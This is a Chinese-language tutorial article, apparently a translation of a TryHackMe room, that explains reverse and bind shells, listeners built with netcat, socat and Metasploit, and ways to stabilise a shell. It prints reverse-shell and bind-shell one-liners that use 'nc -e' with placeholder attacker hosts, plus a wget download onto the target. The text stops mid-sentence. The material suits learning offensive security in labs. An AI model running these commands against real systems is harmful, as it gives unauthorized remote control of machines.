---
title: Privilege Escalation 权限提升
url: https://mp.weixin.qq.com/s/DnkhoIAod0aoQWDQUkZwuA
source: Doonsec's feed
date: 2026-03-20
fetch_date: 2026-03-21T04:06:08.865472
---

# Privilege Escalation 权限提升

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lFfjZayicKlHsOicQ1IWIB66AuMicDUCW9EJTicL9ZK4P9EstibVSHIxje5zZCjvbicXmZy1DkP2PansIKoEAibO0BsxkXBs2HxhM1VKDFplrNtul0/0?wx_fmt=jpeg)

# Privilege Escalation 权限提升

蚁景网安

![]()

在小说阅读器中沉浸阅读

以下文章来源于蚁景网络安全
，作者twe1v3

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7Yk0SeU4ibQcLl1mDLlqhbAOdK1Ik3EO85soOvkh9e8wQ/0)

**蚁景网络安全**
.

致力于为你带来更实用的网络安全技术内容！

## 第 1 章 前言

这是 tryhackme 渗透测试章节的最后一个房间。原本想谷歌机翻然后我手工看一下，但是感觉这样练习不了英文，所以全部手工翻译，实在翻不出来再交给谷歌。手工翻译不免存在勘误，建议英文好的读者朋友们直接去阅览原文。

## 第 2 章 shell

权限提升，简称提权。在讲提权之前，先说说常见的 shell 以及它们的加固。

### 2.1 shell 是什么？

在我们深入了解发送和接收 shell 的复杂性之前，理解 shell 是什么很重要。

简单来说，shell 就是我们与命令行环境 (CLI) 交互时使用的工具。例如，Linux 中常见的 bash 或 sh 程序都是 shell 的示例。Windows 中的 cmd.exe 和 Powershell 也是如此。

有时我们可在目标机上进行 RCE，在这种情况下我们希望利用此漏洞来获取在目标机的 shell。

简单来说，我们可以强制远程机器向我们发送对其的命令行访问（reverse shell），或是我们主动连接到该机器上并获得该机器的 shell。

> reverse shell 就是反向/反弹 shell 的意思 bind shell 就是正向 shell

### 2.2 工具篇

我们将使用多种工具来接收 reverse shell 和发送 bind shell。

通常我们需要恶意的 shell code 以及和生成的 shell 交互的方法。我们可通过以下几个工具实现这一点：

**1. Netcat：**

Netcat 号称网络的 “瑞士军刀” 。它用于执行各种网络交互，包括在枚举期间抓取 banner 等。

然而对于我们来说更重要的是它可以用于接收反弹 shell 或者连接到目标机上的 bind shell 的远程端口。

注：默认情况下，Netcat shell 非常不稳定（容易丢失），所以后文会介绍改进的技术。

**2. Socat：**

Socat 就像 steroids（英文原意是类固醇） 上的 netcat。它可以做所有相同的事情，甚至更多。Socat shell 通常比 netcat shell 更稳定，从这个意义上说它远远优于 netcat。然而 socat 相比于 netcat 有以下两个问题：

1. 1. Socat 语法比 Netcat 难
2. 2. Socat 普及性不如 Netcat。默认情况下，几乎每个 Linux 发行版都安装了 Netcat。但它们默认情况下很少安装 Socat。

这两个问题都有解决方法，我们将在后面介绍。

Socat 和 Netcat 都有用于 Windows 的 .exe 版本。

**3. Metasploit -- multi/handler:**

> 注意，以下有效载荷、有效负载等指的是 payload 的意思。

Metasploit 框架的 `auxiliary/multi/handler` 模块与 socat 和 netcat 一样，提供了用于接收反弹 shell 的功能。由于是 Metasploit 框架的一部分，所以 multi/handler 提供了一种成熟的方式来获取稳定的 shell，并提供了多种进一步的选项来改进捕获到的 shell。它也是与 meterpreter shell 交互的唯一方式，也是处理 staged payload （分阶段 payload？）的最简单方式。

**4. Msfvenom：**

与 multi/handler 一样，**msfvenom** 在技术上是 Metasploit 框架的一部分，但是，它作为独立工具提供。Msfvenom 用于动态生成 payload 。虽然 msfvenom 可以生成除 reverse 和 bind shell 之外的 payload，但这不是本文的重点。

**Msfvenom 是一个非常强大的工具，因此我们将在专门的任务中更详细地介绍它。**

除了我们已经介绍过的工具之外，还有许多不同语言的一些 shell 存储库。其中最突出的一个是 Payloads all the Things。此外，PentestMonkey Reverse Shell Cheatsheet 也很常用。

除了这些在线资源，Kali Linux 还预装了位于 `/usr/share/webshells` 的各种 webshell。 SecLists repo 虽然主要用于单词列表，但也包含一些用于获取 shell 的非常有用的代码。

### 2.3 Shell 的类型

我们主要对两种 shell 感兴趣：Reverse shell 和 bind shell。

* • **Reverse shell（反弹/向 shell）** 是指目标被迫连接到您的计算机。在您自己的计算机上，您可以使用上一个任务中提到的工具之一来设置用于接收连接的侦听器。

反向 shell 是绕过防火墙规则的好方法，因为防火墙规则可能会阻止您连接到目标上的任意端口。

反向 shell 的缺点是当通过 Internet 从一台机器接收 shell 时，您需要配置自己的网络以便接受它。（最经典的例子就是使用阿里的云服务器接收反弹的 shell 时要修改安全组规则）

* • **bind shell（正向 shell）** 是指在目标上执行代码时，我们直接让其打开一个附加到 shell 上的监听器（即端口）。端口将会向互联网开放，这意味着您可以连接到代码打开的端口并以这种方式获得 RCE 的能力。这具有不需要在您自己的网络上进行任何配置的优点，但可能会被保护目标的防火墙阻止。

一般情况下，反向 shell 更容易执行和调试。以下会给出反弹 shell 和 正向 shell 的示例，请注意它们间的区别。

**Reverse Shell 的例子：**

让我们从更常见的反向 shell 开始。以下图为例，在左侧我们有一个反向 shell 侦听器——这是接收连接的地方。右侧是发送反向 shell 的模拟（实际上，这更有可能通过远程网站上的代码注入或类似的方式来完成）把左边的图片想象成你自己的电脑，把右边的图片想象成目标。

在攻击机器上： `sudo nc -lvnp 443`

在目标机器上： `nc <攻击机的ip> <攻击机的端口> -e /bin/bash`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfO68kjsWsJjhTic3otFGdYvjfKmgOlf5ibkfkicdru4SibuzCvcS4A7VMdzLrH0HCiaULNATGtyqZR6Ag/640?wx_fmt=png "null")

image-20230407145552538

请注意，在运行右侧的命令后，侦听器会收到一个连接。当运行 `whoami` 命令时，我们看到我们正在以目标用户的身份执行命令。这里重要的是我们正在攻击机上监听，并收到了来自目标的连接。

> nc 的 -e 选项表示在连接成功后要执行的程序，这里表示连接成功之后把自己的 bash 发送到另一端

**bind shell 的例子：**

bind shell 不太常见，但仍然非常有用。以下图为例，在左侧同样是攻击者的计算机，而右侧依然是我们的模拟目标。但是为了稍微调整一下，这次我们将使用 Windows 目标。首先，我们在目标上启动一个侦听器——这次我们告诉它连接完毕后执行 cmd.exe。然后，在侦听器启动并运行的情况下，我们从自己的机器连接到新打开的端口。

在目标机上： `nc -lvnp <port> -e "cmd.exe"`

在攻击机上： `nc <目标机ip> <port>`

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfO68kjsWsJjhTic3otFGdYvEJxTyKHwZbVy3xx3ZBV0BHiaoR0egjBDqQlacpXjicssGicbglCKoibn9Q/640?wx_fmt=png "null")

如您所见，这再次让我们在目标机上执行代码。请注意，这并非特定于 Windows。这里要理解的重要一点是目标在监听特定端口，然后我们主动连接到目标的这个端口。

与此任务相关的最后一个概念是交互性。shell 可以是交互式的，也可以是非交互式的。

* • 交互式：如果您使用过 Powershell、Bash、Zsh、sh 或任何其他标准 CLI 环境，那么您将习惯于交互式 shell。交互式的 shell 允许您在执行程序后与程序进行交互。例如，采用 SSH 登录的提示：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfO68kjsWsJjhTic3otFGdYvBpsV6ZmyJpVqh1NJHWBKaZ6YhYbibV3tL3yeYWVLOr2H6ibmB9Je0eAw/640?wx_fmt=png "null")

在这里您可以看到它以交互方式询问用户键入 yes 或 no 以继续连接。这是一个交互式程序，需要交互式 shell 才能运行。

* • 非交互式 shell 不会给你那种 “奢侈” 。在非交互式 shell 中，您只能使用不需要用户交互即可正常运行的程序。不幸的是，大多数简单的反向 shell 和正向 shell 都是非交互式的，这会使进一步的利用变得更加棘手。让我们看看当我们尝试在非交互式 shell 中运行 SSH 时会发生什么：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfO68kjsWsJjhTic3otFGdYv6pYDhqdgp7REdmiau1F5DfOIFc6d9q8lQnvGc2rpxacLOXu5DI5B0Nw/640?wx_fmt=png "null")

请注意，whoami 命令（非交互式）执行地很好，但 ssh 命令（交互式）根本没有给我们任何输出。

> 注：交互式命令的输出确实会出现在某个地方，但是，弄清楚在哪里是您自己尝试的练习。可以说交互式程序在非交互式 shell 中不起作用。此外， 上图的 listener 命令是用于演示的攻击机独有的别名，是 `sudo rlwrap nc -lvnp 443` 命令的简写方式，将在后续任务中介绍。除非已在本地配置别名，否则它将无法在任何其他计算机上运行。

**回答下列问题：**

1. 1. 哪种类型的 shell 会回连到您计算机上的侦听端口，反向 (R) 或绑定 (B)？
2. 2. 您已将恶意 shell 代码注入网站。您收到的 shell 可能是交互式的吗？（是或否）
3. 3. 使用 bind shell 时，您会在攻击者 (A) 还是目标 (T) 上执行侦听器？

### 2.4 Netcat

如前所述，Netcat 是渗透测试人员工具包中最基本的工具之一，涉及任何类型的网络。有了它，我们可以做各种各样有趣的事情，但现在让我们关注和 netcat 相关的 shell。

++Reverse Shells++

在前面的任务中，我们看到反弹 shell 需要 shellcode 和一个侦听器。执行 shell 的方法有很多种，因此我们将从查看侦听器开始。

使用 Linux 启动 netcat 侦听器的语法如下：

`nc -lvnp <端口号>`

* • `-l` 用于告诉 netcat 这将是一个监听器
* • `-v` 用于请求详细输出
* • `-n` 告诉 netcat 不解析主机名及DNS，在此不过多阐述。
* • `-p` 表示要监听的端口。

上一个任务中的示例使用 443 端口。实际上，您可以使用任何您喜欢的端口，只要还没有服务使用它即可。

> 请注意，如果您选择使用小于 1024 的端口，则在启动侦听器时需要加上 `sudo`。

使用众所周知的端口号（80、443 或 53 是不错的选择）通常是个好主意，因为这更有可能通过目标上的出站防火墙规则。比如以下命令在 443 端口上打开一个侦听器：

```
sudo nc -lvnp 443
```

然后，我们可以使用任意数量的 payload 连接到以上侦听器，具体取决于目标上的环境。

++Bind Shells++

如果我们希望在目标上获得 bind shell，那么我们可以假设已经有一个侦听器在目标的特定端口上等待我们，我们需要做的就是连接到它。其语法相对简单：

```
nc <目标IP> <目标上的特定端口>
```

在这里，我们使用 netcat 在我们选择的端口上建立到目标的出站连接。

### 2.5 加固 Netcat shell

在得到一个 Netcat shell 之后，我们首先应该做什么？

答案是加固我们得到的 shell！

默认情况下，这些 shell 非常不稳定。例如按 `Ctrl + C` 会断开 shell。

此外它们还是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat shell 实际上是在终端内运行的进程，而不是真正的终端本身。

幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。下文我们将介绍三个加固 netcat shell 的方法。

> 注：Windows 反弹 shell 的加固往往很困难。好在我们下文介绍的第二种技术对此特别有用。

#### 技术 1：Python

我们要讨论的第一种技术仅适用于 Linux 机器，因为它们几乎总是默认安装 Python。该技术有三个操作步骤：

1. 1. 首先要做的是在目标机的 shell 上（无论是反向的还是正向的）执行如下命令`python -c 'import pty;pty.spawn("/bin/bash")`它使用 Python 生成功能更好的 bash shell。请注意，某些目标可能需要指定 Python 版本。如果是这种情况，请根据需要将 “python” 替换为 “python2” 或 “python3”。

命令执行完毕后我们的 shell 看起来会更漂亮一些，但我们仍然无法使用 tab 键进行自动补齐，并且 Ctrl + C 仍会终止 shell。

1. 1. 第二步是在**目标机**的 shell 上执行 `export TERM=xterm` 命令。这将使我们能够访问诸如 `clear` 之类的术语命令。
2. 2. 最后也是最重要的一步，使用 `Ctrl + Z` 挂起目标的 shell 回到**我们的终端**并输入以下命令：`stty raw -echo;fg`以上命令做了两件事情：
3. 3. 它关闭了我们的终端回显（这允许我们可以使用 `tab` 自动补齐以及在 shell 内部输入 `Ctrl + C` 终止进程）。
4. 4. 回到目标机的 shell 上从而完成整个加固 shell 的过程。

下图是一个完整的示例：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfO68kjsWsJjhTic3otFGdYvictFFh2avwceStayD4GwKRbRzxjyM0ZoWCiahO9z8GxU6Ap9lQzkA1aA/640?wx_fmt=png "null")
> 注意到如果 shell 断开了，那么你的终端上的任意输入都将不可见（因为之前我们禁用了终端回显）。不过我们可以输入 `reset` 命令修复这一点。

#### 技术 2：rlwrap

`rlwrap` 是一个程序，简单来说，它能让我们在收到 shell 后就立即拥有访问历史记录、tab 键自动补齐等功能。但是，如果您希望能够在 shell 中使用 `Ctrl + C`，则还需进行一些操作。

Kali 默认没有安装 rlwrap，所以首先使用 `sudo apt install rlwrap` 安装它。

使用 rlwrap 开启一个侦听器的语法很简单，仅需要在 nc 命令的前面加上 **rlwrap** 即可。

```
rlwrap nc -lvnp <监听的端口>
```

在我们的 netcat 侦听器前面加上 **“rlwrap”** 可以为我们提供一个功能更齐全的 shell。

这种技术在处理 Windows shell 时特别有用。(众所周知 Windows shell 很不稳定)。在处理 Linux 目标时，可以使用上述讲到的技术来加固 shell：

1. 1. 使用 Ctrl + Z 挂起 shell
2. 2. 使用如下命令加固 shell 并重新进入。`stty raw -echo；fg`

#### 技术 3：Socat

第三种稳定 shell 的方法是以 Netcat shell 为基础，得到一个更加稳定的 Socat shell。

> **请记住，此技术仅限于 Linux 目标**。因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定。

为了实现这种稳定方法，我们首先需要将一个 静态的 socat 编译的二进制文件（一个编译为没有依赖关系的程序版本）传输到目标机器。

**如何上传文件到目标机器？**

一般的方法是在存放 socat 二进制文件的目录下开启一个 web 服务器（在攻击机器上），然后让目标机访问该 web 服务器并下载 socat 文件即可。

如果安装了 python，可以使用以下命令开启一个 web 服务器：

```
sudo python3 -m http.server 80
```

若是 python2 的话，则应输入以下命令：

```
sudo python -m SimpleHTTPServer
```

然后就可以在目标机器的 netcat shell 上下载文件了。

如果 Linux 系统，可以使用 `curl` 或 `wget` (`wget <LOCAL-IP>/socat -O /tmp/socat`) 来下载文件。

如...